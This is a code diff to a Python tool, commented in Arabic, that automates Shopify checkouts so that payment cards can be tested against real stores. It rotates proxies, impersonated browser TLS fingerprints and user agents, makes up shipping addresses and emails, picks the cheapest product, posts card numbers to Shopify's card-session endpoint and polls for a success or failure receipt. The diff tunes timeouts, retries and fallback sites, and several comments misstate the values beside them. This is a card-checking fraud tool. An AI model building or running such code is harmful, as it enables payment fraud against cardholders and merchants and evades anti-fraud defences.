@@ -38,7 +38,7 @@ USER_AGENTS = [
 
 _site_429_cache = {}
 _site_429_cache_lock = threading.Lock()
-_SITE_429_TTL = 1800
+_SITE_429_TTL = 1800  # 30 دقيقة
 
 # ──────────────────────── Enums / Result types ───────────────────────
 
@@ -126,6 +126,7 @@ COUNTRY_ADDRESSES: Dict[str, Address] = {
     "AE":    Address("ahmed", "al-mansouri","Sheikh Zayed Road 1",  "",          "Dubai",         "AE", "DU",  "12345",   "+97141234567",  "gmail.com"),
 }
 
+# Fallback order when US shipping is rejected
 SHIPPING_FALLBACK_ORDER = ["CA", "GB", "AU", "DE", "FR", "NL", "IE", "SE", "NO", "DK"]
 
 EMAIL_DOMAINS  = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com","aol.com","mail.com","yandex.com","proton.me"]
@@ -154,7 +155,7 @@ def get_fallback_addresses(exclude_country: str = "US") -> List[Address]:
 # ──────────────────────── TLS Client ─────────────────────────────────
 
 class TLSClient:
-    def __init__(self, timeout=3, proxy_url=None, impersonate=None, user_agent=None):
+    def __init__(self, timeout=5, proxy_url=None, impersonate=None, user_agent=None):  # timeout من 12 إلى 5
         self.timeout = timeout
         if impersonate is None:
             impersonate = random.choice(BROWSER_PROFILES)
@@ -228,7 +229,7 @@ def get_all_sites() -> List[str]:
 
 def test_site_alive(client: TLSClient, shop_url: str) -> bool:
     try:
-        resp = client.get(shop_url, timeout=2)
+        resp = client.get(shop_url, timeout=3)  # timeout من 10 إلى 3
         if resp.status_code != 200:
             return False
         html_content = resp.text
@@ -238,7 +239,7 @@ def test_site_alive(client: TLSClient, shop_url: str) -> bool:
     except:
         return False
 
-def get_working_sites(client: TLSClient, sites: List[str], max_to_try: int = 1) -> List[str]:
+def get_working_sites(client: TLSClient, sites: List[str], max_to_try: int = 2) -> List[str]:  # max_to_try من 10 إلى 2
     working = []
     sites_to_try = sites[:max_to_try] if len(sites) > max_to_try else sites
     random.shuffle(sites_to_try)
@@ -247,8 +248,9 @@ def get_working_sites(client: TLSClient, sites: List[str], max_to_try: int = 1) 
         try:
             if test_site_alive(client, site):
                 working.append(site)
+                print(f"[+] Working site found: {site}")
             else:
-                continue
+                print(f"[-] Dead site: {site}")
         except:
             continue
     
@@ -267,11 +269,12 @@ def get_random_working_site(client: TLSClient) -> Optional[str]:
 
 _product_cache: Dict[str, tuple] = {}
 _product_cache_lock = threading.Lock()
-_PRODUCT_CACHE_TTL  = 3600
+_PRODUCT_CACHE_TTL  = 3600  # ساعة
 
 # ──────────────────────── Extract products from JSON ─────────────────
 
 def _extract_products_from_json(data: dict) -> List[Tuple[str, str, str, str]]:
+    """استخرج المنتجات من JSON"""
     results = []
     
     def extract(obj):
@@ -305,11 +308,11 @@ def _extract_products_from_json(data: dict) -> List[Tuple[str, str, str, str]]:
     extract(data)
     return results
 
-# ──────────────────────── Find product ─────────────────────────────────
+# ──────────────────────── Find product - النسخة المطورة ─────────────────────────────────
 
 MAX_PRODUCT_PRICE = 20.0
 MIN_PRODUCT_PRICE = 0.50
-MAX_PRODUCT_PAGES = 3
+MAX_PRODUCT_PAGES = 5  # زيادة عدد الصفحات للبحث عن أرخص سلعة
 
 def find_cheapest_product(client: TLSClient, shop_url: str, min_price: float = MIN_PRODUCT_PRICE, max_price: float = MAX_PRODUCT_PRICE, fallback_sites: List[str] = None) -> Tuple[str, str, str, str]:
     now = _time.time()
@@ -319,7 +322,7 @@ def find_cheapest_product(client: TLSClient, shop_url: str, min_price: float = M
             if now - _site_429_cache[shop_url] < _SITE_429_TTL:
                 if fallback_sites:
                     random.shuffle(fallback_sites)
-                    for alt_site in fallback_sites[:1]:
+                    for alt_site in fallback_sites[:2]:  # من 5 إلى 2
                         if alt_site != shop_url:
                             try:
                                 return find_cheapest_product(client, alt_site, min_price, max_price, None)
@@ -346,7 +349,7 @@ def find_cheapest_product(client: TLSClient, shop_url: str, min_price: float = M
                 _site_429_cache[shop_url] = now
             if fallback_sites:
                 random.shuffle(fallback_sites)
-                for alt_site in fallback_sites[:1]:
+                for alt_site in fallback_sites[:2]:
                     if alt_site != shop_url:
                         try:
                             return find_cheapest_product(client, alt_site, min_price, max_price, None)
@@ -355,9 +358,11 @@ def find_cheapest_product(client: TLSClient, shop_url: str, min_price: float = M
             raise Exception(f"Site returned 429 - no working fallback")
         raise e
     
+    # إذا لم نجد منتجاً بالسعر المطلوب، نبحث عن أرخص سلعة
     return _find_cheapest_product_any_price(client, shop_url)
 
 def _find_product_from_sources(client: TLSClient, shop_url: str, min_price: float = MIN_PRODUCT_PRICE, max_price: float = MAX_PRODUCT_PRICE):
+    # ===== 1. جرب من /collections/all =====
     try:
         result = _find_product_from_collections(client, shop_url, min_price, max_price)
         if result:
@@ -366,6 +371,7 @@ def _find_product_from_sources(client: TLSClient, shop_url: str, min_price: floa
         if "429" in str(e):
             raise e
     
+    # ===== 2. جرب من /search =====
     try:
         result = _find_product_from_search(client, shop_url, min_price, max_price)
         if result:
@@ -374,6 +380,7 @@ def _find_product_from_sources(client: TLSClient, shop_url: str, min_price: floa
         if "429" in str(e):
             raise e
     
+    # ===== 3. جرب من الصفحة الرئيسية =====
     try:
         result = _find_product_from_homepage(client, shop_url, min_price, max_price)
         if result:
@@ -382,6 +389,7 @@ def _find_product_from_sources(client: TLSClient, shop_url: str, min_price: floa
         if "429" in str(e):
             raise e
     
+    # ===== 4. جرب من /products.json (مع بحث شامل) =====
     try:
         result = _find_product_from_products_json_extended(client, shop_url, min_price, max_price)
         if result:
@@ -394,7 +402,7 @@ def _find_product_from_sources(client: TLSClient, shop_url: str, min_price: floa
 
 def _find_product_from_homepage(client: TLSClient, shop_url: str, min_price: float = MIN_PRODUCT_PRICE, max_price: float = MAX_PRODUCT_PRICE):
     try:
-        resp = client.get(shop_url, timeout=2)
+        resp = client.get(shop_url, timeout=3)
         if resp.status_code == 429:
             raise Exception("returned 429")
         if resp.status_code != 200:
@@ -404,12 +412,12 @@ def _find_product_from_homepage(client: TLSClient, shop_url: str, min_price: flo
         product_links = re.findall(r'href="([^"]*\/products\/[^"]+)"', html_content)
         
         if product_links:
-            for link in product_links[:1]:
+            for link in product_links[:2]:  # من 5 إلى 2
                 try:
                     if not link.startswith('http'):
                         link = shop_url + link
                     
-                    resp = client.get(link, timeout=2)
+                    resp = client.get(link, timeout=3)
                     if resp.status_code != 200:
                         continue
                     
@@ -455,7 +463,7 @@ def _find_product_from_homepage(client: TLSClient, shop_url: str, min_price: flo
 
 def _find_product_from_collections(client: TLSClient, shop_url: str, min_price: float = MIN_PRODUCT_PRICE, max_price: float = MAX_PRODUCT_PRICE):
     try:
-        resp = client.get(f"{shop_url}/collections/all", timeout=2)
+        resp = client.get(f"{shop_url}/collections/all", timeout=3)
         if resp.status_code == 429:
             raise Exception("returned 429")
         if resp.status_code != 200:
@@ -465,12 +473,12 @@ def _find_product_from_collections(client: TLSClient, shop_url: str, min_price: 
         product_links = re.findall(r'href="([^"]*\/products\/[^"]+)"', html_content)
         
         if product_links:
-            for link in product_links[:1]:
+            for link in product_links[:2]:  # من 5 إلى 2
                 try:
                     if not link.startswith('http'):
                         link = shop_url + link
                     
-                    resp = client.get(link, timeout=2)
+                    resp = client.get(link, timeout=3)
                     if resp.status_code != 200:
                         continue
                     
@@ -499,7 +507,7 @@ def _find_product_from_collections(client: TLSClient, shop_url: str, min_price: 
                     continue
         
         try:
-            resp = client.get(f"{shop_url}/collections/all/products.json?limit=3", timeout=2)
+            resp = client.get(f"{shop_url}/collections/all/products.json?limit=5", timeout=3)  # limit من 5 إلى 5
             if resp.status_code == 200:
                 data = resp.json()
                 for p in data.get('products', []):
@@ -517,7 +525,7 @@ def _find_product_from_collections(client: TLSClient, shop_url: str, min_price: 
 
 def _find_product_from_search(client: TLSClient, shop_url: str, min_price: float = MIN_PRODUCT_PRICE, max_price: float = MAX_PRODUCT_PRICE):
     try:
-        resp = client.get(f"{shop_url}/search?q=*&view=json", timeout=2)
+        resp = client.get(f"{shop_url}/search?q=*&view=json", timeout=3)
         if resp.status_code == 429:
             raise Exception("returned 429")
         if resp.status_code == 200:
@@ -534,7 +542,7 @@ def _find_product_from_search(client: TLSClient, shop_url: str, min_price: float
             except:
                 pass
         
-        resp = client.get(f"{shop_url}/search?q=*", timeout=2)
+        resp = client.get(f"{shop_url}/search?q=*", timeout=3)
         if resp.status_code == 429:
             raise Exception("returned 429")
         if resp.status_code != 200:
@@ -544,12 +552,12 @@ def _find_product_from_search(client: TLSClient, shop_url: str, min_price: float
         product_links = re.findall(r'href="([^"]*\/products\/[^"]+)"', html_content)
         
         if product_links:
-            for link in product_links[:1]:
+            for link in product_links[:2]:  # من 5 إلى 2
                 try:
                     if not link.startswith('http'):
                         link = shop_url + link
                     
-                    resp = client.get(link, timeout=2)
+                    resp = client.get(link, timeout=3)
                     if resp.status_code != 200:
                         continue
                     
@@ -582,6 +590,7 @@ def _find_product_from_search(client: TLSClient, shop_url: str, min_price: float
         return None
 
 def _find_product_from_products_json_extended(client: TLSClient, shop_url: str, min_price: float = MIN_PRODUCT_PRICE, max_price: float = MAX_PRODUCT_PRICE):
+    """بحث موسع في products.json مع إمكانية تصفح عدة صفحات"""
     with _site_429_cache_lock:
         if shop_url in _site_429_cache:
             if _time.time() - _site_429_cache[shop_url] < _SITE_429_TTL:
@@ -593,9 +602,10 @@ def _find_product_from_products_json_extended(client: TLSClient, shop_url: str, 
     variant_id = ""
     price_str = ""
     
+    # البحث في عدة صفحات
     for page in range(1, MAX_PRODUCT_PAGES + 1):
         try:
-            resp = client.get(f"{shop_url}/products.json?limit=3&page={page}", timeout=2)
+            resp = client.get(f"{shop_url}/products.json?limit=5&page={page}", timeout=3)
             
             if resp.status_code == 429:
                 with _site_429_cache_lock:
@@ -622,6 +632,7 @@ def _find_product_from_products_json_extended(client: TLSClient, shop_url: str, 
                     except (ValueError, TypeError):
                         continue
                     
+                    # إذا كان السعر ضمن النطاق المطلوب، نختاره مباشرة
                     if min_price <= price <= max_price:
                         if price < best_price:
                             best_price = price
@@ -630,6 +641,7 @@ def _find_product_from_products_json_extended(client: TLSClient, shop_url: str, 
                             variant_id = str(v.get("id", ""))
                             price_str = v.get("price", "")
             
+            # إذا وجدنا منتجاً بسعر مناسب، نخرجه
             if product_title:
                 return product_title, product_id, variant_id, price_str
                 
@@ -638,9 +650,13 @@ def _find_product_from_products_json_extended(client: TLSClient, shop_url: str, 
                 raise e
             continue
     
-    return None
+    # إذا لم نجد منتجاً بالسعر المطلوب، نبحث عن أرخص سلعة في الموقع
+    return _find_cheapest_product_any_price(client, shop_url)
 
 def _find_cheapest_product_any_price(client: TLSClient, shop_url: str) -> Tuple[str, str, str, str]:
+    """
+    تبحث عن أرخص سلعة في الموقع بغض النظر عن السعر
+    """
     with _site_429_cache_lock:
         if shop_url in _site_429_cache:
             if _time.time() - _site_429_cache[shop_url] < _SITE_429_TTL:
@@ -652,9 +668,10 @@ def _find_cheapest_product_any_price(client: TLSClient, shop_url: str) -> Tuple[
     cheapest_variant_id = ""
     cheapest_price_str = ""
     
+    # البحث في products.json
     for page in range(1, MAX_PRODUCT_PAGES + 1):
         try:
-            resp = client.get(f"{shop_url}/products.json?limit=3&page={page}", timeout=2)
+            resp = client.get(f"{shop_url}/products.json?limit=5&page={page}", timeout=3)
             
             if resp.status_code == 429:
                 with _site_429_cache_lock:
@@ -1071,11 +1088,11 @@ def send_pci_session(ident_sig: str, card_number: str, card_name: str,
         "user-agent":           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
     }
 
-    with Session(impersonate=random.choice(BROWSER_PROFILES), timeout=3) as session:
+    with Session(impersonate=random.choice(BROWSER_PROFILES), timeout=5) as session:  # timeout من 12 إلى 5
         if proxy_url:
             session.proxies = {"http": proxy_url, "https": proxy_url}
         resp = session.post("https://checkout.pci.shopifyinc.com/sessions",
-                            data=payload, headers=headers, timeout=3)
+                            data=payload, headers=headers, timeout=5)
     return resp.status_code, resp.text
 
 # ──────────────────────── Proposal helpers ───────────────────────────
@@ -1730,12 +1747,12 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
     impersonate = random.choice(BROWSER_PROFILES)
     user_agent = random.choice(USER_AGENTS)
     
-    client = TLSClient(timeout=3, proxy_url=proxy_url,
+    client = TLSClient(timeout=5, proxy_url=proxy_url,  # timeout من 12 إلى 5
                        impersonate=impersonate, user_agent=user_agent)
     
     try:
         all_sites = get_all_sites()
-        fallback_sites = [s for s in all_sites if s != shop_url][:1] if all_sites else None
+        fallback_sites = [s for s in all_sites if s != shop_url][:2] if all_sites else None  # من 5 إلى 2
         
         try:
             title, product_id, variant_id, price = find_cheapest_product(client, shop_url, fallback_sites=fallback_sites)
@@ -1853,7 +1870,7 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                 
                 signed_check = extract_signed_handles(p3_body)
                 if not signed_check:
-                    time.sleep(0.005)
+                    time.sleep(0.02)  # من 0.05 إلى 0.02
                     _, p3_body2 = send_proposal3(client, shop_url, checkout_url, checkout_token, session_token,
                                                  stable_id, variant_id, price, proposal_id, build_id, source_token,
                                                  q3, email, addr, currency, country)
@@ -1915,7 +1932,8 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
             current_tax = extract_tax_amount(final_proposal_body)
             current_total = total_amount
             
-            MAX_TAX_RETRIES = 1
+            # ===== تعديل: تقليل محاولات الضريبة من 4 إلى 2 =====
+            MAX_TAX_RETRIES = 2
             for tax_attempt in range(1, MAX_TAX_RETRIES + 1):
                 submit_status, submit_body = send_submit_for_completion(
                     client, shop_url, checkout_url, checkout_token, session_token,
@@ -1932,7 +1950,7 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                         current_tax = new_tax
                     if new_total:
                         current_total = new_total
-                    time.sleep(0.005)
+                    time.sleep(0.02)
                     continue
                 break
             
@@ -1963,7 +1981,8 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
         poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
         type_name_re = re.compile(r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')
         
-        for poll_num in range(1, 4):
+        # ===== تعديل: تقليل محاولات Polling من 30 إلى 5 =====
+        for poll_num in range(1, 6):
             try:
                 _, poll_body = send_poll_for_receipt(
                     client, shop_url, checkout_url, checkout_token, session_token,
@@ -1978,6 +1997,7 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                 status_code = extract_receipt_status_code(poll_body, receipt_type)
                 result.status_code = status_code
                 
+                # ===== استخراج receipt_url =====
                 try:
                     poll_json = json.loads(poll_body)
                     receipt_obj = poll_json.get("data", {}).get("receipt", {})
@@ -2027,16 +2047,17 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                         result.error = Exception(f"{error_code}")
                         return result
                 
-                delay = 20
+                # ===== تعديل: تقليل زمن الانتظار =====
+                delay = 50  # من 500 إلى 50
                 match = poll_delay_re.search(poll_body)
                 if match:
                     try:
                         d = int(match.group(1))
                         if d > 0:
-                            delay = min(d, 20)
+                            delay = min(d, 50)
                     except ValueError:
                         pass
-                time.sleep(min(delay, 20) / 1000.0)
+                time.sleep(min(delay, 50) / 1000.0)
                 
             except Exception as e:
                 result.status = CheckStatus.ERROR
@@ -2044,7 +2065,7 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -
                 return result
         
         result.status = CheckStatus.ERROR
-        result.error = Exception("exceeded 3 poll attempts")
+        result.error = Exception("exceeded 5 poll attempts")  # من 30 إلى 5
         return result
         
     finally:
